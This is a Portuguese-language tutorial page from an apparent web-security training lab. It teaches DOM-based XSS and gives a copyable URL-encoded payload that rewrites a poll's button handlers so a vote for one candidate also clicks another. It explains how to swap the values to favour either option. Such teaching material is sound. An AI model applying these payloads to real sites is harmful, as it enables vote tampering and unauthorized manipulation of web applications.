<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/menu.css" rel="stylesheet">
    <link href="../css/fonts.css" rel="stylesheet">
    <link href="../css/tutorial_before_lab.css" rel="stylesheet">
    <link href="../css/general_config.css" rel="stylesheet">
    <link href="../css/tutorials_box.css" rel="stylesheet">
    <link href="../css/copy_button.css" rel="stylesheet">
    <link href="../css/modifiable_code.css" rel="stylesheet">
    <script src="../js/jquery.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="../js/popper.min.js"></script>
    <script src="../js/bootstrap.bundle.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/bootstrap.min4.5.js"></script>

    <title>Votação XSS DOM</title>
</head>

<style>

body {
    overflow-x: hidden;
}	
.writer{
    padding-left:10px;
    padding-top: 5px;
    padding-bottom: 5px;
}
.image-container {
    margin-left: 0px;
    padding-left: 10px;
    padding-top: 5px;
}
.image-container img{
    width: 85%;
    height: auto;
}
.robot-speech {
    min-width: 460px;
    max-width: 460px;
}
.robot-speech::after{
    top: -20px; 
    right: 5px; 
    transform: rotate(45deg);  
}
.container-robot {
    display: block;
    margin-top: 10px;
    z-index: 10;
    max-height: 10px;
    width: 25vw; 
    margin-right: 10px;
}
#robot-img{
    width: 250px;
    height: 250px;
    transform: translate(-10px, -30px);
}
.code{
    text-align:left;
    padding-left: 90px;
    margin-top: 110px;
    margin-bottom: 50px;
    margin-right:95px;
    word-break: break-all; 
}
@media (min-width: 2200px){
    .code {
        margin-top: 120px;
    }
}
</style>

<body>
    
<div style="display: flex; width: 100%;">
    <?php include '../menu_lateral_interm.php'; ?>
    <div class="content" style="margin: 0px">
            <div class="image-container">
            <img src="../img/tutorial/intermediario-dom1-pagina2.png" alt="">
            </div>
    
    <div class ="container-robot" style="transform: translate(32vw, -8vw) scale(1);">
        <div class="robot-speech">
            <p class="writer" id="balloon-text">
            Explorando o XSS DOM, podemos observar que será possível manipular os resultados da votação conforme visto anteriormente. Agora, explore este ataque e veja a execução!
            </p>
        </div>
        <div class="robot d-inline-flex align-items-center justify-content-center">
        <img src="../img/robot.png" alt="robot-icon" id="robot-img" >
        </div>
  </div>
        <div class="code">
            <div id="codeBlock">
                <code>
                &amp;query=query=document.querySelector(%27%23candidate2%20button%27).setAttribute(%27onclick%27,%20%27vote(2);%20setTimeout(function()%20{%20document.querySelector(%22%23candidate1%20button%22).click();%20},%20100);%27);
                </code> 
            </div>
            <button class="copyButton" id="copyButton">Copiar Código</button>
            <button class="copyButton copied" id="copied">Copiado <img src="../img/check.png" alt="" width=20px;></button>
            <p></p>
            <p> Note que, se desejar manipular a votação para favorecer o produto 2 em vez do produto 1, basta trocar os seguintes valores 1 e 2 em destaque no script: </p>
        
            <div class="modify-container">
                <div class="modify-header">
                    <span class="terminal-symbol">>_</span>
                </div>
                <div class="modify-code">
                &amp;query=query=document.querySelector(%27%23candidate<span class="highlight">2</span>%20button%27).setAttribute(%27onclick%27,%20%27vote(<span class="highlight">2</span>);%20setTimeout(function()%20{%20document.querySelector(%22%23candidate<span class="highlight">1</span>%20button%22).click();%20},%20100);%27);                
                </div>
            </div>
        <p></p>
        <p> Realize estas alterações abrindo um editor de texto e faça um teste!</p>
        </div>
        <div class="container-buttons">
        <a href="./lab1-dom1.php"  style="color: white; text-decoration: none; z-index:100;">
            <div class="btn btn-primary transition-button" id="transition-back">
            &lt;&lt;Retornar
            </div>
        </a>
        <button class="btn btn-primary transition-button" id="transition-next" style="color: white; text-decoration: none;" onclick="finishTask(taskNo, redirPath)">
                    Laboratório&gt;&gt;
        </button>
            </div>
        </div>
    </div>
</div>

<script>
var taskNo = 16;
var redirPath = "../laboratorio/voting_lab.php?atividade=dom_vote";
let caso = 'EIA';
</script>
<script src ="../js/robotUpdate.js"></script>
<script src="../js/copy_button.js"></script>
<script src="../js/progress.js"></script>
<script src="../js/writerTutorial.js"></script>
<script src="../js/menuLateral.js"></script>
<script src="../js/robotAdjustment.js"></script>
<script>
transformRobotForMenuState(-6, 3);
</script>
</body>
</html>
